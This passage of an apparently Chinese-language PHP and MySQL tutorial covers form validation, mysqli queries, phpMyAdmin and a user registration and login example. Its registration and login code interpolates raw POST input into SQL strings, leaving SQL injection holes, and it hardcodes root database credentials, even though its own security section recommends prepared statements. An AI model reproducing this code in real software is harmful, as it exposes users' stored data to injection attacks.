<span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">FormData</span>(form)</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (data.<span class="property">status</span> === <span class="string">&quot;error&quot;</span>) &#123;</span><br><span class="line">        data.<span class="property">errors</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="title function_">alert</span>(error));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;注册成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><hr><h4 id="四、关键代码解析"><a href="#四、关键代码解析" class="headerlink" title="四、关键代码解析"></a>四、<strong>关键代码解析</strong></h4><h5 id="1-表单提交处理"><a href="#1-表单提交处理" class="headerlink" title="1. 表单提交处理"></a>1. <strong>表单提交处理</strong></h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$email</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]);</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mobile&#x27;</span>]);</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$errors</span> = [];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 必填项校验</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$email</span>)) <span class="variable">$errors</span>[] = <span class="string">&quot;邮箱必填&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$mobile</span>)) <span class="variable">$errors</span>[] = <span class="string">&quot;手机必填&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$password</span>)) <span class="variable">$errors</span>[] = <span class="string">&quot;密码必填&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 格式校验</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-zA-Z0-9_]+@[a-zA-Z0-9_]+\.[a-zA-Z]&#123;2,&#125;$/&quot;</span>, <span class="variable">$email</span>)) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&quot;邮箱格式错误&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^1[3-9]\d&#123;9&#125;$/&quot;</span>, <span class="variable">$mobile</span>)) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&quot;手机号格式错误&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\w&#123;6,&#125;$/&quot;</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&quot;密码需6位以上&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回结果</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$errors</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>, <span class="string">&quot;errors&quot;</span> =&gt; <span class="variable">$errors</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;success&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-前端表单"><a href="#2-前端表单" class="headerlink" title="2. 前端表单"></a>2. <strong>前端表单</strong></h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;signupForm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>邮箱<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>手机<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;mobile&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;signupForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    e.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;index.php&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">FormData</span>(<span class="variable language_">this</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (data.<span class="property">status</span> === <span class="string">&quot;error&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            data.<span class="property">errors</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="title function_">alert</span>(error));</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;注册成功&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h4 id="五、安全与性能优化"><a href="#五、安全与性能优化" class="headerlink" title="五、安全与性能优化"></a>五、<strong>安全与性能优化</strong></h4><ol><li><p><strong>防 XSS 攻击</strong>：输出用户输入时使用 <code>htmlspecialchars()</code>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$userInput</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>防 SQL 注入</strong>：使用预处理语句（后续课程内容）。</p></li><li><p><strong>减少服务器压力</strong>：前端校验减少无效请求。</p></li></ol><hr><h4 id="六、错误与调试"><a href="#六、错误与调试" class="headerlink" title="六、错误与调试"></a>六、<strong>错误与调试</strong></h4><table><thead><tr><th>错误场景</th><th>解决方案</th></tr></thead><tbody><tr><td>表单数据未提交</td><td>检查表单的 <code>method</code> 是否为 <code>post</code></td></tr><tr><td>正则表达式不匹配</td><td>使用在线工具（如 regex101.com）调试</td></tr><tr><td>错误信息未显示</td><td>确保 <code>json_encode</code> 正确输出 JSON</td></tr></tbody></table><hr><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h4 id="一、PHP-与-MySQL-的定位"><a href="#一、PHP-与-MySQL-的定位" class="headerlink" title="一、PHP 与 MySQL 的定位"></a>一、<strong>PHP 与 MySQL 的定位</strong></h4><table><thead><tr><th>技术</th><th>定位</th><th>核心作用</th></tr></thead><tbody><tr><td><strong>PHP</strong></td><td>服务器端脚本语言</td><td>处理业务逻辑、生成动态内容、操作数据库、管理会话等。</td></tr><tr><td><strong>MySQL</strong></td><td>关系型数据库管理系统（RDBMS）</td><td>存储结构化数据（如用户信息、商品数据），提供高效的数据查询和管理能力。</td></tr></tbody></table><hr><h4 id="二、关系型数据库的核心概念"><a href="#二、关系型数据库的核心概念" class="headerlink" title="二、关系型数据库的核心概念"></a>二、<strong>关系型数据库的核心概念</strong></h4><ol><li><p><strong>表（Table）</strong><br>• 数据存储的基本单元，由**行（记录）<strong>和</strong>列（字段）**组成。<br>• <strong>示例</strong>：用户表 <code>user_center</code> 包含 <code>id</code>、<code>name</code>、<code>password</code> 等字段。</p></li><li><p><strong>主键（Primary Key）</strong><br>• 唯一标识一条记录的字段（如 <code>id</code>），确保数据唯一性。</p></li><li><p><strong>数据类型</strong><br>• 常见类型：<code>INT</code>（整数）、<code>VARCHAR</code>（字符串）、<code>DATE</code>（日期）等。<br>• <strong>示例</strong>：<code>id INT(11) AUTO_INCREMENT PRIMARY KEY</code>。</p></li><li><p><strong>SQL 语句</strong><br>• <strong>增删查改</strong>：<br>  ◦ <strong>插入数据</strong>：<code>INSERT INTO user_center (name, password) VALUES (&#39;meng&#39;, &#39;123456&#39;);</code><br>  ◦ <strong>查询数据</strong>：<code>SELECT * FROM user_center WHERE name = &#39;meng&#39;;</code><br>  ◦ <strong>更新数据</strong>：<code>UPDATE user_center SET password = &#39;654321&#39; WHERE id = 1;</code><br>  ◦ <strong>删除数据</strong>：<code>DELETE FROM user_center WHERE id = 1;</code></p></li></ol><hr><h4 id="三、PHP-操作-MySQL-的核心步骤"><a href="#三、PHP-操作-MySQL-的核心步骤" class="headerlink" title="三、PHP 操作 MySQL 的核心步骤"></a>三、<strong>PHP 操作 MySQL 的核心步骤</strong></h4><ol><li><p><strong>连接数据库</strong><br>使用 <code>mysqli</code> 扩展建立连接：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;ma_soldier&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>执行 SQL 语句</strong><br>• <strong>查询示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user_center&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ID: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>] . <span class="string">&quot; - Name: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>插入示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO user_center (name, password) VALUES (&#x27;lee&#x27;, &#x27;123456&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;新记录插入成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>关闭连接</strong>  </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure></li></ol><hr><h4 id="四、PHPMyAdmin-的核心功能"><a href="#四、PHPMyAdmin-的核心功能" class="headerlink" title="四、PHPMyAdmin 的核心功能"></a>四、<strong>PHPMyAdmin 的核心功能</strong></h4><ol><li><p><strong>图形化管理工具</strong><br>• 支持数据库的创建、表结构设计、数据增删改查。<br>• <strong>常用操作</strong>：<br>  ◦ 创建数据库：<code>CREATE DATABASE ma_soldier;</code><br>  ◦ 新建表：定义字段名、类型、约束（如自增长 <code>AUTO_INCREMENT</code>）。<br>  ◦ 导入&#x2F;导出数据：支持 SQL 文件或 CSV 格式。</p></li><li><p><strong>SQL 执行界面</strong><br>• 直接编写并执行 SQL 语句，实时查看结果。</p></li></ol><hr><h4 id="五、安全性注意事项"><a href="#五、安全性注意事项" class="headerlink" title="五、安全性注意事项"></a>五、<strong>安全性注意事项</strong></h4><ol><li><p><strong>防 SQL 注入</strong><br>• 使用预处理语句（Prepared Statements）：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO user_center (name, password) VALUES (?, ?)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$name</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure></li><li><p><strong>敏感数据保护</strong><br>• 密码加密存储：使用 <code>password_hash()</code> 函数。<br>• 避免明文存储密码：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hashed_password</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$password</span>, PASSWORD_DEFAULT);</span><br></pre></td></tr></table></figure></li></ol><hr><h4 id="六、实战场景示例"><a href="#六、实战场景示例" class="headerlink" title="六、实战场景示例"></a>六、<strong>实战场景示例</strong></h4><p><strong>用户注册功能流程</strong>：</p><ol><li>用户提交表单（HTML）。</li><li>PHP 接收表单数据，校验合法性（如邮箱格式、密码长度）。</li><li>通过 <code>mysqli</code> 连接 MySQL，将数据插入 <code>user_center</code> 表。</li><li>返回注册成功&#x2F;失败提示。</li></ol><p><strong>代码片段</strong>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 连接数据库</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;ma_soldier&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 校验输入</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;用户名和密码不能为空&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入数据</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], PASSWORD_DEFAULT);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO user_center (name, password) VALUES (&#x27;<span class="subst">$name</span>&#x27;, &#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;错误: &quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure><hr><h4 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、<strong>总结</strong></h4><table><thead><tr><th>关键点</th><th>说明</th></tr></thead><tbody><tr><td><strong>PHP 角色</strong></td><td>处理业务逻辑，通过 SQL 语句操作 MySQL 数据库。</td></tr><tr><td><strong>MySQL 角色</strong></td><td>存储结构化数据，提供高效查询和管理能力。</td></tr><tr><td><strong>核心协作</strong></td><td>PHP 通过 <code>mysqli</code> 或 PDO 扩展与 MySQL 交互，实现动态 Web 应用。</td></tr><tr><td><strong>学习路径</strong></td><td>掌握 SQL 语法 → 学习 PHP 数据库操作 → 实战项目（如用户系统、商品管理）。</td></tr></tbody></table><hr><h1 id="PHP-MySQL"><a href="#PHP-MySQL" class="headerlink" title="PHP+MySQL"></a>PHP+MySQL</h1><h4 id="一、功能概述"><a href="#一、功能概述" class="headerlink" title="一、功能概述"></a>一、<strong>功能概述</strong></h4><p>• <strong>目标</strong>：实现用户注册、登录功能，结合前端交互与后端数据库操作。<br>• <strong>技术栈</strong>：<br>  • <strong>前端</strong>：HTML表单 + JavaScript校验（使用ydata插件）。<br>  • <strong>后端</strong>：PHP处理业务逻辑，MySQL存储用户数据。<br>  • <strong>数据库</strong>：<code>user_center</code>表（字段：<code>id</code>, <code>name</code>, <code>password</code>, <code>mobile</code>）。</p><hr><h4 id="二、核心实现步骤"><a href="#二、核心实现步骤" class="headerlink" title="二、核心实现步骤"></a>二、<strong>核心实现步骤</strong></h4><h5 id="1-数据库设计"><a href="#1-数据库设计" class="headerlink" title="1. 数据库设计"></a>1. <strong>数据库设计</strong></h5><p>• <strong>表结构</strong>：</p>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> user_center (</span><br><span class="line">    id <span class="type">INT</span>(<span class="number">11</span>) AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    mobile <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">UNIQUE</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>• <strong>关键字段</strong>：<br>  • <code>id</code>：自增长主键。<br>  • <code>mobile</code>：唯一约束，防止重复注册。</p><h5 id="2-前端表单与校验"><a href="#2-前端表单与校验" class="headerlink" title="2. 前端表单与校验"></a>2. <strong>前端表单与校验</strong></h5><p>• <strong>注册表单</strong>：</p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;registerForm&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;用户名&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;tel&quot;</span> <span class="attr">name</span>=<span class="string">&quot;mobile&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;手机号&quot;</span> <span class="attr">data-v-mobile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;密码&quot;</span> <span class="attr">data-v-password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;confirm_password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;确认密码&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>• <strong>校验规则</strong>（通过ydata插件配置）：<br>  • 密码长度≥8，包含字母&#x2F;数字&#x2F;下划线。<br>  • 手机号格式校验（正则表达式）。</p><h5 id="3-后端处理逻辑（PHP）"><a href="#3-后端处理逻辑（PHP）" class="headerlink" title="3. 后端处理逻辑（PHP）"></a>3. <strong>后端处理逻辑（PHP）</strong></h5><p>• <strong>连接数据库</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;ma_soldier&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>注册功能</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;register&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mobile&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], PASSWORD_DEFAULT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查用户名或手机号是否已存在</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user_center WHERE name=&#x27;<span class="subst">$name</span>&#x27; OR mobile=&#x27;<span class="subst">$mobile</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名或手机号已被注册&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 插入新用户</span></span><br><span class="line">        <span class="variable">$insertSql</span> = <span class="string">&quot;INSERT INTO user_center (name, password, mobile) VALUES (&#x27;<span class="subst">$name</span>&#x27;, &#x27;<span class="subst">$password</span>&#x27;, &#x27;<span class="subst">$mobile</span>&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$insertSql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;错误: &quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>登录功能</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询用户</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user_center WHERE name=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="comment">// 验证密码</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;欢迎, &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;密码错误&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户不存在&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-前端交互与反馈"><a href="#4-前端交互与反馈" class="headerlink" title="4. 前端交互与反馈"></a>4. <strong>前端交互与反馈</strong></h5><p>• <strong>AJAX提交</strong>（示例）：</p>  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title 